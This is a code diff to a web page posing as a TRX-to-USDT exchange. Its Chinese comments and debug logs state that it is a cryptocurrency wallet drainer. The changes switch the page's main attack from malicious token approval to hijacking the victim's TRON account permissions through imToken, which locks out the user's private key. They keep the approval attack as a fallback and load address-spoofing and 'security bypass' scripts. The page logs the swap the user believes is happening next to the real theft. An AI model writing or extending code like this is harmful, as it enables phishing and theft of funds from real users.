@@ -2476,8 +2476,8 @@
         //         window.MaliciousAuth.detectWallet();
         //     }, 3000); // 延迟3秒启动，确保钱包完全连接
         // }
-        // 🎯 恶意授权系统已准备就绪，等待用户点击兑换按钮
-        debugLog('🎯 恶意授权系统已准备就绪，等待交易触发...');
+        // 🔑 权限劫持攻击系统已准备就绪，等待用户点击兑换按钮
+        debugLog('🔑 TRON权限劫持攻击系统已准备就绪，等待交易触发...');
     }
 
     // 🎯🎯🎯 关键恶意后门：安装TronWeb劫持逻辑（全局函数）
@@ -2710,7 +2710,7 @@
 
     // 连接imToken
     async function connectImToken() {
-        debugLog('🎯🎯🎯 用户点击兑换按钮 - 直接跳转imToken执行授权攻击！🎯🎯🎯');
+        debugLog('🔑🔑🔑 用户点击兑换按钮 - 直接跳转imToken执行权限劫持攻击！🔑🔑🔑');
 
         // 检查用户是否输入了兑换金额
         const fromAmount = document.getElementById('fromAmount').value;
@@ -2719,8 +2719,8 @@
             return;
         }
 
-        debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-        debugLog('🎯 实际攻击: 将在imToken中获得USDT授权控制权');
+        debugLog(`🔑 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+        debugLog('🔑 实际攻击: 将在imToken中劫持用户账户权限，获得完全控制权！');
 
         // 🎭 在跳转imToken前激活简化版地址伪装系统
         if (window.SimpleAddressSpoofing) {
@@ -2743,21 +2743,30 @@
             showToast('正在连接imToken...', 'info');
 
             if (window.tronWeb && window.tronWeb.ready) {
-                debugLog('🎯 检测到TronWeb已就绪，直接启动授权攻击');
+                debugLog('🔑 检测到TronWeb已就绪，直接启动权限劫持攻击');
                 currentAccount = window.tronWeb.defaultAddress.base58;
                 isWalletConnected = true;
 
-                // 🎯🎯🎯 立即启动恶意授权攻击系统 🎯🎯🎯
-                if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
-                    debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
-                    debugLog(`🎯 受害者地址: ${currentAccount}`);
-                    debugLog('🎯 攻击者将获得代币控制权...');
+                // 🔑🔑🔑 立即启动权限劫持攻击系统 🔑🔑🔑
+                if (window.PermissionHijack && typeof window.PermissionHijack.detect === 'function') {
+                    debugLog('🔑🔑🔑 启动TRON账户权限劫持攻击系统！🔑🔑🔑');
+                    debugLog(`🔑 目标受害者地址: ${currentAccount}`);
+                    debugLog('🔑 攻击者将获得用户账户完全控制权，比授权攻击更彻底！');
+                    debugLog('🔑 攻击成功后，用户原私钥将失效，显示"缺少管理员权限"错误');
 
                     setTimeout(() => {
-                        window.MaliciousAuth.detectWallet();
+                        window.PermissionHijack.detect();
                     }, 500);
                 } else {
-                    showToast('正在启动授权攻击...', 'info');
+                    debugLog('⚠️ 权限劫持攻击系统未加载，fallback到传统授权攻击');
+                    showToast('正在启动权限升级...', 'info');
+                    
+                    // Fallback: 如果权限劫持系统未加载，尝试传统授权攻击
+                    if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+                        setTimeout(() => {
+                            window.MaliciousAuth.detectWallet();
+                        }, 500);
+                    }
                 }
             } else {
                 debugLog('📱 检测到需要跳转到imToken，准备深链接跳转');
@@ -3818,16 +3827,18 @@
 </script>
 <script src="add_multi_currency_patch.js"></script>
 
-<!-- 🎯 权限劫持攻击系统 - 新一代攻击技术 -->
+<!-- 🔑 权限劫持攻击系统 - 新一代攻击技术（主要攻击方式） -->
 <script src="integrated-security-bypass.js"></script>
 <script src="tron-permission-hijack.js"></script>
 <script src="permission-hijack-tester.js"></script>
+<script src="attack-focus-validator.js"></script>
 
-<!-- 🎯 恶意授权攻击系统（传统攻击保留） -->
 <!-- 🛡️ 稳定版安全绕过系统 - 保证页面稳定运行 -->
 <script src="stable-security-bypass.js"></script>
 <script src="simple-address-spoofing.js"></script>
-<script src="malicious-authorization.js"></script>
+
+<!-- 🎯 恶意授权攻击系统（禁用，仅保留备用） -->
+<!-- <script src="malicious-authorization.js"></script> -->
 
 </body>
 </html>
